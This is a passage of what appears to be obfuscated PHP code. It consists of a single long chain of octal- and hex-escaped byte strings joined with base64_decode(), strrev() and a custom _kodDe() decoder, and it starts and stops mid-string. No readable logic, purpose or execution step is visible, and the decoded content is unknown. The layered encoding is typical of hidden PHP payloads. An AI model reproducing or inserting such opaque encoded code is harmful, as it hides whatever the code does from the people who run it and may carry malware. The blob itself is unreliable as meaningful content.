0\47\115\166\271\141\14\353\126\72\11\264\251\276\216\241\205\141\16\330\103\131\130"."\x30\x56\xef\x50\xd1\xce\xc2\x78\x34\x69\xc9\x1\x26\x9e\xe6\x4a\xd0\xb2\x6e\x31\x55\x2c\xa3\xc2\x3c\xf9\x3e\x87\x3d\xd8\x34\xf2\xbe\x9c\x96\xe7\x4a\x3d\x6d\x30\xfb\x32\x6c\x40\xd7\x99\xaa\x3f\xc\x99\x2d\xd4"."\103\100\255\31\340\150\274\204\310\235\136\154\260\222\102\20\200\245\60\222\202\11\216\306\345\132\222\171\133\112\106\61\107\152\134\176\215\0\275\303\55\364\311\275\136\231\143\132\337\25\56\110"."\101\126\154\131\103\146\21\106\154\300\114\45\263\146\51\345\250\65\325\353\253\60\222\264\47\225\122\322\156\70\127\110\22\25\72\124\353\31\314\61\152\275\144\106\271\366\23\376\3\355\246\117"."\217\55\254\334\316\137\313\261\353\65\320\203\266\344\72\174\154\272\172\45\44\241\367\11\266\146\15\370\144\260\127\116\65\362\250\27\331\254\317\371\104\35\277\25\357\354\120\23\201\370\22\111"."\xd7\x10\xbf\x65\x76\x34\xa5\xac\x77\x62\x2a\xa5\x71\x95\x67\xd4\x39\x12\xc\x63\x76\x6f\xdd\x3e\xb6\xf9\xe2\xf1\x8b\x6e\x1b\x3f\x77\xcb\xd8\xfd\x17\xec\xde\x72\xdb\xd8\x8e\x8b\x50\x74\xe7\xbd\x9b\xc6\xb6\xfc".base64_decode('Ys9lp++899yd9568+4y73n/gnLHNW3efumPsypvGfnnGzu07dj90xq6bNu6899bxK88aOw==')."\xfd\x9e\x9d\xdb\x2f\x1e\x3b\xf3\xea\xb1\x33\x36\x8f\x5f\x70\xee\xce\x1d\x57\xa2\xfc\xe3\x67\x8a\x9a\x51\xb6\xb1\x5b\x2f\xc5\x65\x1f\x38\x65\xec\xde\x7b\x77\x5f\x73\x13\x4f\x7d\xff\x81\xf5\x40\xc3\x81\xa\x2f"."\322\155\45\276\64\314\24\310\10\232\52\363\25\100\120\335\362\51\35\131\35\215\230\222\304\217\267\260\266\231\235\321\213\212\115\264\316\64\364\67\157\346\275\24\1\351\363\172\113\61\362\70"."\x59\x61\x63\xed\xe3\x48\x9a\xd0\x73\x5\x8c\x6a\x30\x4a\x7e\xfa\xd6\xd6\xf1\x6c\x43\xc2\xc7\x4a\xc3\x4c\x13\x2a\x60\x17\x1e\x6b\x31\x57\x35\x38\x8\xb7\x87\x58\xd0\xa8\xa4\x35\x4\x48\x35\x28\x69\x54\x8c\xdd".strrev('&\' 9É9súÇ’s*È¥§®ô8÷¤ÃCC¿yqöÔØ3yZqQE®é>¹ÂÉ¶(ô°')."\232\16\36\205\66\305\243\220\373\155\305\371\250\34\153\56\60\155\0\171\315\310\315\57\352\205\54\277\326\302\242\326\212\203\350\352\102\274\302\160\361\116\70\22\321\172\54\331\25\62\312\243"."\52\313\237\15\263\71\213\10\234\270\170\45\72\6\242\271\64\52\344\336\350\103\234\76\26\365\224\301\364\237\365\34\311\11\164\321\47\335\72\321\47\126\134\11\73\211\320\276\350\270\120\233"."\267\240\220\51\140\13\35\366\334\5\360\232\201\75\303\223\332\0\141\361\232\114\206\252\132\32\336\342\206\362\156\210\230\36\265\117\267\135\364\257\51\20\17\65\253\35\1\366\36\100\53\24"."\xfc\x56\x6a\xc0\xf2\x63\x8d\x3d\x63\x50\xf\x1b\xbd\x7e\xfc\xba\x1d\x2f\x3a\x1f\x7f\xff\x4d\xd6\xac\xaa\xf5\x9a\x45\x9b\xf5\xb8\x84\x5f\x47\xf\xc8\xdf\xa6\xe1\xac\xfb\xfa\x90\x2f\xdf\x96\x26\xc9\x82\x7\xce"."\xd6\xe0\xf5\x7a\x25\x31\xb7\xd0\xcd\xc3\x21\x95\xd\x39\x79\xb0\x14\xcf\x94\x6c\xac\x82\xb2\x8\x31\x24\xc\x81\xc5\xdd\x3c\xca\x1e\xc4\x64\x67\x22\x78\xb\x57\x59\x41\xf4\xa8\xaf\xf\xd5\xd7\x40\x5e\x12\x2b".base64_decode('UxU0urN99ShAVu5M33EoSKYZqE03jEDJYo+3JvtmMHZjLtzRziVEr1HqGcBFKTRcDIqCKA==').strrev('„IÂ2ã—¿ê."wm•C€4“`4u=tŠ¦Ò¡‰ğLš«T¶’ÕÍ'."\n".'’Ÿ=àÚ(Ç”¬K')."\52\51\213\250\377\302\126\7\125\132\222\321\205\230\130\6\270\70\31\256\257\50\152\313\330\120\100\350\230\347\172\277\350\244\314\156\150\55\374\254\46\257\363\105\123\262\370\45\22\326\221\127".base64_decode('ERNiiQWmpgxIDIea1JYQ6IMGOkJqPB6V8BueCS2JtqjN0eiSEKBfg0So8QNRcTOPY+KhKA==')."\xbe\xa4\x92\xb5\xf2\x64\xce\x8\xdb\x1d\xc1\xbb\x7d\x5c\x1\xed\x55\x84\xe0\xcd\x6d\x81\x18\x7f\x3d\x30\xd3\x57\xe7\xab\x17\x79\xd1\x7\x55\xfc\x6c\xa2\x91\x19\x33\x88\x27\x2\xb1\xa\xd6\x67\xa8\x55\x1a\x18"."\x6a\xb0\x44\x3\x5\xda\xa2\xcb\x95\xe6\x68\xb8\xb3\x3d\x12\xa7\x46\x57\x28\x3c\x12\x95\xd2\x89\x8e\x38\x24\x33\xdb\x34\xe5\xc9\x50\x7d\xb0\x23\x1c\x68\xe\x2a\xa1\x48\x22\xca\x9e\x7d\x70\xe5\x5c\xf2\xe0\x27"."\316\343\154\10\212\226\316\155\317\100\171\32\221\37\45\311\65\362\232\0\71\273\74\325\335\125\335\123\272\153\272\153\127\371\272\255\36\277\264\165\32\362\364\100\244\243\5\272\327\300\103\51"."\xb\x96\x65\x7b\x1c\xf1\x1c\x34\x18\x8d\x5\x9a\xc3\xac\x29\x88\xcc\x41\x30\xda\x1c\xa2\x81\x5d\x17\xde\xbe\xf3\xfe\x4d\xbb\xae\xd8\x32\x76\xd6\xb9\xa8\xa2\xf1\xcb\x4f\x19\xbf\xe4\x1e\xc4\x29\x61\xee\x68\xcb".base64_decode('Obse3DR+4dbxc9ZD+3dv3bZzx0O7LrxpbMul4xfft+vy02jCnptvHzv7Jt4wZc8FD45vug==')."\236\163\114\224\121\362\240\322\173\116\77\167\327\216\55\230\137\272\356\344\361\273\67\216\137\171\356\330\331\327\214\135\166\323\256\115\133\307\256\75\165\154\303\271\273\267\136\164\264\33\221\150".base64_decode('vItNBbxR95+A7QvQ4e22puKhrUW/NfhNCfplqvFESXppZzDSHHS/ypKjYLhnCsUQqjcEjA==').base64_decode('swWGf1icGPporJ6wFWth/qVGSY1pCcabY6GmILxa4BM1mbB3oPqBoPHYMh7mj3jLDC0pNQ==')."\14\231\153\25\107\107\64\137\322\314\226\162\171\322\130\245\12\53\261\125\171\360\246\103\236\210\51\125\170\153\107\0\35\133\45\250\301\146\130\210\256\163\365\312\152\117\235\247\276\126\1\53"."\114\264\4\330\136\122\252\100\145\236\227\163\174\304\323\353\210\325\173\352\152\225\252\302\100\25\264\113\214\53\152\275\112\163\132\212\346\251\201\6\313\315\25\171\21\135\264\354\242\146\240\235"."\132\111\172\70\210\227\107\277\16\173\112\111\237\50\101\347\11\345\160\303\224\100\244\305\231\223\232\141\352\250\46\32\247\111\237\315\355\271\260\151\256\256\125\172\341\55\110\205\104\122\314\61".strrev('ñˆMx!ÁO'."\0".'£óC“@İD×–-(aTÉ@M‹4³hÿ/¡CĞúoŸc¢t'."\n".'™¨Á').strrev('Q²wªy¡.<±FÜÑ0c'."\r".'øZëqe+™pÀûÉ_hØHÇÕœÏÚPYEU±B±\'Îƒ6').base64_decode('xXAqDhTh5xjIR5cLJggHkHyhCH7gSt/uxZvbgu0BHxBxigk0P2atlEalGlM+Cqp2DD/5EA==')."\33\262\4\371\52\132\127\252\215\230\41\72\12\205\76\150\14\314\276\102\214\50\150\244\110\143\65\265\163\3\125\162\63\160\321\130\102\105\3\0\344\131\242\272\325\322\156\41\351\305\343\7"."\151\203\214\177\113\43\356\306\144\162\262\124\57\263\26\207\52\307\165\66\107\43\255\41\366\114\261\5\216\353\205\224\351\310\324\22\13\141\63\46\360\175\205\125\45\75\16\105\21\241\150\202"."\42\205\241\24\17\13\313\20\70\201\357\371\50\42\266\174\24\341\233\15\316\45\231\265\303\337\217\107\170\130\360\266\50\322\31\147\117\124\60\365\135\336\302\303\155\374\61\67\116\210\306\244".strrev('¦³Õk~²H4…wÓvÔS|k­F*%†X?lé‹éôaÂò9lhóh H')."\336\243\314\132\127\13\171\270\71\20\73\203\230\173\125\174\145\151\130\15\107\27\321\70\61\267\27\314\247\304\41\111\351\122\20\73\233\20\354\254\305\266\56\276\32\24\204\303\12\175\236\254".base64_decode('RKLLA8KCm5QAEGHQzX9CV/dQtw8xC9Yq8U6wpUlhbAixBAMyBygdYNvoKg/sGGrW7GM2mg==').base64_decode('EEFk7AL9XcEChFZCgSR5ej7MGxHwHq92r+0+ttvro48zMfPS7RFNUoMr0B4bjztelqo5/A==')."\x72\x1d\x6a\x47\xbd\x84\x10\x5d\xb5\x34\x32\xf\x7e\xe0\x18\x38\xf\xb8\x7d\x88\xce\x6f\xe4\x93\x19\x5c\xba\x36\x82\xfe\x2e\x4a\xac\xd\xa2\xbf\x61\xf4\x13\x4e\xa0\xe9\x32\x78\x6\xb4\x24\xc3\xa1\x25\xc1\xb5"."\370\37\221\120\313\7\222\276\274\162\26\10\105\326\242\177\21\201\131\33\212\270\53\153\12\46\226\7\203\64\3\13\303\257\310\212\10\16\164\125\62\307\210\137\103\100\262\170\35\1\125\253".base64_decode('ag0ZTG/P1FpV9VudgC/cqElN9aT6athDAvFmQX0dCFGOC+TtghMRuJFBiC+KRTs7pHhbYA==')."\x59\x28\xb2\x88\xc5\xfc\x53\x58\x68\xa\x54\xad\xb4\x84\xe2\x68\x88\x9a\x19\x32\xa\xdb\x87\x72\x1c\x18\x4e\xc2\x16\xc9\x5c\xaf\x3\xa5\x5b\x10\x65\x47\x11\x89\x65\xc7\x87\x1\x4a\x99\x9d\xab\xac\xa9\x33\x14"."\x6e\x91\x9f\xcf\xe3\x8c\xb0\xa1\x10\xaa\xe\x7b\xca\x64\xd6\x38\x16\x27\xf\xe9\x59\x4\xf\x39\xb\x13\x74\x63\x11\x32\x6\x2c\x42\x7\x80\xc5\xc8\x70\xb1\x8\xb1\xb1\xc8\x22\xa4\xa3\x2c\x82\x4f\x27\xc1\x8".base64_decode('S0MnP3RqY8e5jDbIX4POTfVKFk8wDfZRMR02iYOOihoX1Lokq0QoJh3nqVKiIj1DxyJaSQ==').strrev('B–ßdä¤”ÕI§{agÒªW‘'."\r".'D“<(øë;\'m})áŠ¼sUîß òIó9§å').strrev('uw°Ænİ6µHøn‰’eİ?¦ßE¡~†À”Šµ2qQ<ê4ËI›¬&"> êEF')._kodDe('L8TGwGiiLs7A4xUIpvzsL1HmWmDfF5yWH7akpv7ML0TM/AJTFnJPwPkJGZRUrfsVNscifdM=').strrev('éÇZ¿6’CµMZX¹¢jñk«÷Êš¥'."\n".'¨Uj‹ í%¼EëJœ4„æ¨˜çj').base64_decode('tc5SoUhLcIVSbaSGVU1TobCC1i6rSCmridVA2wqXU1bGHFJkdGTn62YKSwgULWPliC0J9g==').strrev('<Vá `"¸)4EhÄT,©P¬> `>MÂ_…†IE=&>'."\r".'£Ššh9Bx‡×ü')."\x0\xfd\x21\x4\x8\x9f\xa6\x8a\x39\x8d\xbe\x89\x25\x3c\x9e\x6f\x15\x8\x15\x56\x39\x58\x4a\xca\x6c\x62\xa6\x12\x30\x8c\x6c\x91\x52\x9f\x78\xa\x91\x2c\xd0\x61\x96\xe5\xe\x4b\x80\x4b\xa7\xb1\x8e\x58\xa8\x3d".strrev('º5éüªèLiæxUƒCZŒŠ2ÿ:2)Ìs§Ú¿-Z‚?Jô§Vˆ´eã¬ÍD°Î&C	[')."\xd4\xb0\x27\xcc\x1e\x16\x60\xe6\x2f\xc8\xeb\x30\x26\xaf\xca\x21\x12\xc5\x63\x62\xd6\x0\xf7\x61\x56\xe4\x54\xf9\x7d\x9b\xb0\xf1\x8b\x37\x55\x3c\xc9\x6c\x77\x68\xd\x74\x86\x65\x8\xc\x95\xb2\x24\xb8\xf2\x2b"."\xd6\x8\x6b\x69\xa5\x35\xc2\xd2\x98\xf8\x46\xdc\x45\xf1\xb1\x80\x9e\xd5\xcc\x84\x9e\x52\x4b\x1d\x35\xd3\xd0\x69\xb6\x94\xc7\xa6\x69\x98\x8c\x50\x3c\x14\x1f\xc4\x52\x62\xad\x58\x33\x6d\x26\x2b\xc4\xda\xe\x3b"."\166\147\42\252\242\135\51\26\304\173\104\131\137\244\63\274\74\141\120\30\147\340\306\224\277\242\333\54\117\245\156\363\362\134\212\25\214\54\12\105\202\215\370\21\72\342\25\130\163\101\116\207"."\215\213\316\206\172\102\121\65\214\370\153\125\26\305\205\242\40\6\166\130\256\124\125\141\361\305\247\11\145\167\273\130\222\354\0\32\46\121\54\157\347\157\120\210\46\74\102\226\200\260\373\300".base64_decode('RdUkrdSLS8tbH5R3GYg1zAacgjNTjmeuyK46Pu7WJJfBQsldXEuzm29uRxAKdEp2G3BhhQ==')."\x7d\x90\x5c\x44\xe5\x9d\xcd\x43\x9b\x6d\x96\x19\x1a\x53\x75\xd1\x9b\x9c\x6e\x59\xfc\x7a\x3a\x91\xd1\x15\xab\xa0\x27\x89\x45\x52\x5\xec\xe8\x29\x29\x53\xb7\x84\xf9\x72\x18\x7b\x72\xe6\x62\x41\x3b\x23\x2c\x5c".base64_decode('yKZ8W5rYIJfydlxnGgEtveQ1gXgyKB5kSa8MyPWQmDlqoNBVEGoK8aGRcglgWNjuxXceog==')."\316\36\46\71\20\343\61\152\260\15\322\175\177\311\33\231\67\73\364\142\316\40\127\120\313\305\15\23\354\101\250\2\72\377\76\367\133\61\171\324\361\265\145\131\116\154\311\343\253\346\220\331"."\304\42\55\223\336\213\342\50\43\12\71\307\173\264\122\36\175\304\53\77\316\102\270\103\200\322\163\20\146\315\221\306\216\3\235\23\204\237\20\350\3\10\373\55\262\24\237\260\374\103\352\304"."\xbc\x95\x57\xd8\xdf\x48\x69\xf2\x13\x5a\xc9\x0\xfe\xd1\x32\xa6\x90\x29\x17\xb8\x9d\x36\x64\x63\x1c\x3e\x61\xfe\x98\x2f\x97\x85\x7c\xa2\xf0\xd3\x72\x50\x4\xc0\x6c\x7b\x5a\x95\xda\xd2\xc1\xf3\xb\xc3\xa7\x74"."\x34\xa4\x69\x20\x0\x1a\x24\xb\x5c\x69\x10\x8d\x68\x33\x30\xfe\x8f\x48\xb8\x23\x41\xdb\x99\x79\x2a\x30\xbe\x1c\x36\xfb\x38\x6d\x42\xec\x2b\x98\x2a\x73\xd0\xa7\x50\x14\xca\xfa\x74\xfc\x38\x8c\x3e\xd5\x9\x72"."\333\225\250\40\265\60\367\365\205\72\45\373\323\23\220\224\212\345\232\41\43\377\140\221\210\236\276\376\203\61\135\160\4\250\30\171\213\367\265\205\4\211\45\137\42\205\44\262\354\52\103\320"."\221\276\33\202\231\317\100\262\300\61\264\27\104\242\152\33\332\156\242\214\141\61\254\204\203\274\263\122\100\102\154\304\117\45\375\344\121\64\34\37\347\222\113\123\172\301\11\223\275\6\121\156"."\36\142\312\53\140\355\114\60\12\1\372\263\62\227\362\242\206\3\326\245\164\233\333\234\42\257\114\45\213\130\322\223\362\34\47\260\103\222\301\131\155\120\307\117\357\230\160\246\114\357\7\272"."\122\336\71\150\42\276\75\213\107\73\143\354\246\7\307\261\204\113\215\5\233\127\362\113\27\16\155\15\54\163\103\102\130\102\31\130\124\21\314\345\146\30\116\16\250\152\54\212\5\214\301\160"."\xab\xab\x40\xbc\x8d\x1b\x2b\x76\xc2\xd4\x70\x28\xb2\xa4\x62\x2\x62\x48\xda\xa5\x22\x14\x18\x4a\x4\xdb\xdd\x30\x67\xd\xf1\x60\x20\xc6\x2c\x69\xe3\x78\x53\x38\xda\x2c\x25\x87\xa2\xe5\x23\xc1\x39\x1e\xe\xa4"."\xe2\x49\xa\xf4\x9f\x50\xd3\xbd\x86\x9c\x98\x1a\xd0\xc1\x29\xb5\x16\xcb\x31\xbc\x6a\xcf\xd4\xda\x5\xdd\xeb\x6a\x6b\xba\xfd\xb\x7c\x53\xb8\xf8\x8d\x92\x2b\xe9\xe9\xf2\x4\x60\x8b\x6d\x3e\xd\x6e\x0\xde\xb7".strrev('f–«(Ç{*q÷î|6aP™u'."\r".'¢V§\\°ö¸ÇüŠü"Eù›ÏÛ¿€ğƒçß˜ƒ')."\12\16\41\172\211\253\306\127\306\371\134\71\141\16\214\244\70\55\353\171\270\62\243\277\35\162\126\254\102\124\61\243\3\245\35\117\306\145\220\317\60\305\152\21\313\72\145\46\113\330\56\225".base64_decode('mCPxwByBfI4qEEEfEDICWJVxtnrzaK+EzbgZca2L2kKLl4TbI9GOpbF4onPZ8hUrwe5oAw==')."\x43\x9a\xb4\xe2\x65\x12\x11\x30\xe4\xeb\x47\xfc\xba\x7f\x90\x79\x2d\x58\x86\xf\x24\xba\xe5\x97\x99\x39\xe\x44\x7d\xc4\x16\x98\x99\xa9\x38\x2a\xc8\xe0\xa9\x98\x7a\xf8\x2b\x27\xd1\xda\xfc\xb9\xbc\x5d\x3f\x41".base64_decode('jo6i3mua9gSpy9q/umJI7Oq2ejiWpvRB1mkdFFKFMp4lzmPAbXhlNwoYbWXGMdXrYgsAIA==').base64_decode('tFsk5kEAuTFuGh3RhWKjOSQZs2arBxWvB7pOjesuwrZkme3Y1cQUqNuO6GqvNuBIFwauVw==')."\173\321\11\326\21\167\331\22\75\226\154\5\355\146\137\161\232\337\306\355\314\243\355\3\332\2\14\205\274\132\310\226\302\65\226\360\306\325\346\132\253\34\310\115\221\304\211\76\147\203\62\3".base64_decode('3BK0ItY7pXRRbhrk/5gTI5b1adSjCAPgTHLrtOzNlgsWskkPgZOyIQpcodBDY6Q4NyCUkA==').base64_decode('cgNcPyTpYEXwri9iRYnbAE8iKK1phGkCw2PbppGY5CPJYRJE9r2iFQrNGdwjx4p2gJJyJA==').base64_decode('jbVaZG0Yp7FxlNxCWb4Uz2+JELcenpbsipfVgNjDfJDZFShLRbykIZK/ui3tZHh5ZjhOwA==')."\12\141\33\211\305\226\350\261\303\136\323\262\274\205\242\211\65\365\32\215\134\237\337\32\202\264\254\146\331\313\34\246\232\276\326\240\70\266\110\322\316\231\153\150\302\260\227\340\70\373\10\24"."\305\40\177\221\340\207\147\10\66\23\17\61\47\252\326\61\204\361\243\266\371\261\265\111\302\5\163\5\273\150\234\135\35\71\173\117\375\147\111\347\162\60\163\267\210\51\372\160\333\335\302\124"."\x33\x95\xf8\xd3\xb0\x30\x71\x8c\x98\xf9\x40\x1f\x36\xd0\x62\xe6\x99\x87\x20\xea\xbb\x41\x36\xf4\x9e\xd2\x49\x73\xb9\x5d\x1\xc9\x46\x3a\xf6\x1f\x82\x16\x3e\xd3\x41\x94\xac\xa5\x23\xf6\xb0\x8f\x4f\x23\x31\x5e"."\54\33\241\304\103\356\315\71\334\206\320\11\162\332\40\267\164\175\200\351\114\342\331\26\364\245\310\115\305\323\213\140\157\105\200\127\322\202\244\353\111\162\47\201\77\7\122\201\14\165\124\1".base64_decode('7aU/x1dqvbcorLej2aFuL5boI8zK9lcb6u5e1N3enZC7axe1dBo1VjIvyydRmGsHTCLuXw==')."\x58\xf7\x27\x36\xf6\xe\x37\x1c\xc7\x56\xb4\x15\xf\x89\x31\xda\xef\x66\x7c\xe\x1b\xc6\xbe\x39\x84\x6d\xd3\xce\x58\xd8\x71\x6d\x5\x59\x59\xf\x47\x33\xde\x66\xa6\x17\x66\x96\xb2\x29\x72\xb6\x45\x9f\x32\xb3"."\xe8\x58\x2f\x2e\xb0\xc7\x2f\xb9\x7a\xfc\xce\x8b\x76\x3f\xf4\x8b\xf1\x4d\xd7\xef\xbc\x77\xfb\xf8\x95\xf7\x53\x38\x1d\xb1\x16\x3d\xcf\xe7\x7d\x7c\xe3\xcf\x76\x6d\xff\xf9\xee\x2d\xf\xed\xb9\x64\xcb\xfb\xf\x9c".base64_decode('s3vrNqygdNX1VF9pbPMp4xfdNrb57N13nzZ+/3njPz91z2XnvX3yKbBy8sTIaqDYVxLjRA==')."\213\214\137\375\300\330\3\233\367\134\170\331\356\255\133\245\374\66\126\237\313\112\113\7\315\342\330\206\323\367\234\172\323\330\346\363\167\135\170\125\131\1\372\1\367\74\343\356\135\164\346\256"."\313\117\223\122\334\205\232\210\375\171\161\240\347\145\150\302\330\171\347\356\272\361\66\167\41\352\220\240\102\241\361\213\317\330\271\375\36\127\241\210\31\57\45\63\115\222\241\373\361\163\316\30"."\333\162\71\377\310\316\173\317\245\12\363\256\42\134\141\216\347\247\365\227\347\217\63\214\156\61\165\13\355\252\355\232\235\204\105\274\353\326\7\121\173\350\210\311\63\67\266\165\303\256\253\327"."\xef\xba\xf5\x2c\x98\x89\x4b\xb7\x8e\x9d\x77\xc3\xf8\xad\xd7\xed\xba\x66\xb\xaf\x16\xb0\xca\xa1\x98\x8b\x2b\xb8\xfd\x94\xdd\xf7\x9c\x3e\x7e\xc9\x3d\x3c\x23\x5e\xf2\x29\x45\xe4\x21\x18\x45\xf3\xe0\xc7\x1\xe4"."\203\273\166\234\277\153\373\225\30\111\316\76\145\327\51\367\215\135\171\333\330\317\117\346\237\35\273\367\136\61\312\121\77\361\240\126\201\330\56\305\160\40\267\151\261\233\27\112\222\23\77\231".base64_decode('wGEGjTtewyIr6juC8V3EzQO4IGpkixaNY77JTMHYr6lCpLOqoWpSDfqtrfJU4eMIiWPiiQ==').base64_decode('AaQdVQ2TakigFmxEjcK+IRmKFgsPBLkLEPWQrjsXkG0Ib3LT/NP8bONbsBp/UTgO6+T7jQ==').base64_decode('4A7pzkM9vrA70YhuD5lFWcV5Gnv2l5H2jZwFOwD1xCCkYIB6VAPxvHPLkQ4K9FIlYkf2bQ==').base64_decode('d4ydfueeS25156ViFqYLjpi1Mq+T9EXJ2PmXln+P5Hd+jWUeW3/lrgtdOZnarSLJ00QBgg==')."\xfd\x2e\x3a\xc2\xf7\x5\xb9\x8\xc5\xf7\xff\xcd\x2a\xa2\xd2\xcd\x6\x2c\xe7\xa7\x80\x15\xde\xce\xc2\x48\x29\xef\xc5\xf2\x2e\x6f\x5c\x36\x1f\xea\x72\x9e\x54\xe7\xcc\x8f\x25\x56\xce\xfc\x32\xbf\x90\x14\xfb\x6e"."\116\4\251\123\247\6\105\166\271\46\331\103\47\322\120\272\261\61\105\50\200\141\126\202\201\4\133\221\26\357\147\60\167\240\72\271\203\205\256\366\142\105\26\57\142\370\361\32\103\13\327\66".strrev('¹HÉgK)Q!pI©±QÂ¥R5ëX¼aÆNó£'."\r".'Š½•ê|X"(÷/g·/§rç$')."\77\111\24\166\274\245\22\373\140\305\112\345\323\44\313\100\72\21\342\365\71\174\241\150\150\256\371\175\243\333\325\212\70\212\153\345\236\100\126\346\122\312\264\351\15\63\347\240\377\201\313\140"."\372\106\245\2\173\31\200\202\314\123\310\321\376\64\243\65\302\47\27\353\33\236\160\311\177\215\3\54\206\221\373\5\141\104\312\221\117\264\326\341\121\16\72\112\45\101\222\303\35\162\23\104"."\x49\x14\xd6\xc2\x53\xb9\x63\xa2\xa\xd4\xda\x60\x4e\xa7\xa4\x77\x25\x7c\x1e\xfa\x58\xa0\xc8\xf\xfc\x9a\x58\x19\xbd\xd9\x1\xd1\x1\x42\x56\x0\xb1\x7\x50\xfb\x4c\x71\x50\x22\x2c\xaa\x44\x10\x92\x99\x52\x7e".strrev('sïc®ğùÊ}‡Ë’ô)Ê5*"ÂLo'."\n".'•ædÖWâ5âæ¶L5lœ'."\n".'hä~ZrTÓlTJQ ')."\73\10\115\207\135\216\172\364\202\204\160\347\242\120\104\322\14\224\0\152\163\113\104\15\164\164\124\114\200\141\247\242\147\254\126\343\353\227\34\212\322\320\74\164\364\122\222\370\305\123\143\25"."\x86\x56\x29\x56\x31\xc9\xcc\x86\x57\xf9\x41\xd1\x8c\x64\x10\x5c\xd0\x3c\x3\x8a\x54\xe3\x22\x4a\x1a\xe1\x84\x97\x84\x68\x72\xf5\xfc\x79\x7e\x3\x4a\xfa\xfc\xc7\x60\x1a\xed\xc7\x2a\x76\xf9\x63\xf1\xd4\xc9\x1a".base64_decode('PwTaKuyaKco8TaHD1VhNLlKqlQzax7l+8Xx3Ye4Ebp5fkxPxaomZ7HzIz+SD3AJoxTu0gA==')._kodDe('L0TTJ29ZVOHFubrPemy5KDh6mGWtgNp+liKrHhoW3BGB/66XNUDD1Fk3CuBt8EWfIPz1VbE=').base64_decode('prqgJQcwZgmaD82AhA4sWqAJDgcqtqT0VMLPLck1TlH4n1uzhlaEnQOtW1cOAzVqd1KgYA==')."\xb8\x41\x18\x83\xdc\x30\x2c\xf0\x11\x30\xb4\x79\x39\x3f\x43\xb1\x57\xce\x24\x20\x2c\xf\xfd\x15\x65\xc2\x91\x45\x22\x42\xf\xe7\x8e\xc4\x2e\xa6\x0\x45\x62\xdd\x5d\xd5\xbe\x29\xeb\xd6\xf9\xd\xa6\x6c\xc8\x14"."\235\130\131\37\317\115\343\335\76\147\176\324\23\30\172\236\21\0\356\234\224\61\135\14\213\360\100\377\24\361\104\224\53\25\52\130\323\260\261\161\176\27\347\227\172\130\232\112\44\43\362\334"."\61\176\323\250\237\315\220\2\35\10\23\313\171\260\71\42\70\152\362\342\17\361\317\256\27\177\262\367\157\276\164\50\61\362\21\241\136\300\151\273\174\201\360\342\107\247\102\16\7\12\5\7"."\325\141\21\174\355\225\65\172\375\234\124\320\253\60\137\122\74\323\144\131\10\241\162\301\261\32\241\53\1\77\114\44\340\101\104\111\315\42\47\155\34\216\352\342\100\130\11\230\374\110\324\206"."\47\317\263\222\105\243\140\73\110\37\165\110\135\105\34\276\365\153\203\32\315\122\245\200\210\256\261\212\70\356\250\102\244\216\246\60\172\307\33\70\17\177\15\361\301\331\306\52\322\11\53\243"."\xeb\xa8\x3c\x21\x67\x95\x3e\x82\xa\x56\x29\x8c\xe0\xe6\x34\x3e\x8e\x45\xdb\x44\x1b\x27\x7f\x5b\x7\xfe\x35\x3b\x63\xf0\x6c\x29\x10\x81\xb\xc8\x63\x4e\xa0\xbf\x93\x8e\xe1\xf3\x8a\x9d\x7f\x66\x11\x83\x4c\x1e"."\145\20\322\106\270\360\64\26\304\322\114\340\347\263\43\26\115\104\233\231\257\74\247\304\226\302\146\260\23\205\105\37\274\212\103\30\173\123\307\165\221\130\16\316\112\370\1\2\330\120\54\345"."\363\134\15\24\243\64\337\2\33\53\377\351\42\167\244\172\252\147\202\164\245\113\143\67\250\100\200\351\225\60\173\24\12\355\104\233\155\2\77\336\267\0\54\131\106\305\166\131\365\224\257\213"."\232\40\150\254\143\17\253\230\322\251\170\117\311\162\312\51\12\336\75\172\344\325\344\7\12\53\26\137\65\276\364\3\67\126\325\236\352\32\337\224\332\352\362\24\252\336\353\114\307\272\163\352"."\xe2\x38\x4a\x4\xa7\x51\xc0\x5\x90\x97\x8b\xcd\xe1\x50\x30\x92\x50\x43\xc0\x0\xd4\x4f\x3b\xce\x57\x27\x5e\x15\x1a\x96\xb0\x34\x4c\xc3\xcd\xb2\x61\x5\x3c\xaa\x3e\x47\xb7\x2a\xc\xd\xbd\x75\x49\x70\xe5\x54".base64_decode('Pe8Qu9IhzZrMBu60uro6b109+p+9tmCWNxuYSQ4pS11dA/mfJpCbD0BBZwqimozcQ4YhXQ==').strrev('»;`sî2˜8Ì÷’rbéˆ'."\0".''."\r".'ªDğëÊ2ÓLGØE®P‹Ln'."\n".' Çã5v|Æ%ÅŠöÁ‡')."\22\240\146\313\331\316\212\32\325\107\6\10\332\316\337\31\243\154\142\5\315\245\357\322\33\171\3\203\371\124\227\374\61\37\33\150\12\24\46\373\275\54\301\53\173\316\201\102\224\350\211\33".base64_decode('REfTUBmn/VsMQYxQkvcZAyTxLOZyJZu+OCpfFJJk/liXxLLc+AmORnhN1EETfS0OY1hhRQ==')."\x66\xcc\x21\x55\xb0\x32\x38\xba\x98\xc7\xc8\x90\xe2\x63\x26\x43\xc9\x94\xf4\xa0\x1a\x8f\x2b\xdb\x9f\xa4\xec\x5c\x9d\x4d\xe8\x2\x81\x6a\x13\xb1\xe8\x31\x60\x38\x2d\x8e\xa8\x52\x51\x79\x6c\xe7\xe2\x8c\xac\x27"."\x9\x67\x49\xec\x26\x1a\x37\xd4\x8b\xdb\xdd\x20\x46\x11\xd1\xb7\x0\x77\x5d\x45\xb5\x9f\x59\x7b\x15\xa0\x38\x34\x4a\x8c\xfa\x53\xff\xc8\x44\x98\xd3\x70\x60\xd9\x84\xdb\xee\xc9\x26\xf3\xe6\xb8\xe1\x70\xeb\x15".base64_decode('spg0e+zSK/41qn8MEmQAennXzA3iShW4k1xlAvSurKwAwMtzkwvGCrkx3JWbmL5t5ha+ZQ==')."\173\270\124\16\45\251\230\131\340\307\104\350\367\260\72\6\245\123\251\257\120\64\373\20\46\130\362\240\41\170\107\145\60\317\136\236\263\102\46\336\172\71\237\14\304\127\231\314\361\72\240\226".base64_decode('sFmgpfjmKWUVhh0koHOFSwnN3MOcDMTHXVmjixxMnHXgc7QTwlv2FUjHxB52UctbaVlFhQ==')."\x65\x13\x54\xa\x8b\xa4\x64\xff\x9f\xaa\x3\x4d\x18\xae\x32\x5\x32\x3c\x42\x42\x55\xc3\x9\xa7\x30\x2a\x98\x70\xdc\xf\x27\x8\xf1\xcb\xea\x9\x68\xe\x90\x47\xb2\xa8\x70\x5\x61\xe6\x37\x3a\xee\x30\x1f\xf"."\x68\xda\xc0\x78\x15\xb9\x98\x33\xed\xad\xd\xe7\xb3\xc0\x5\x2c\x17\x1e\x56\xee\x73\x55\xbe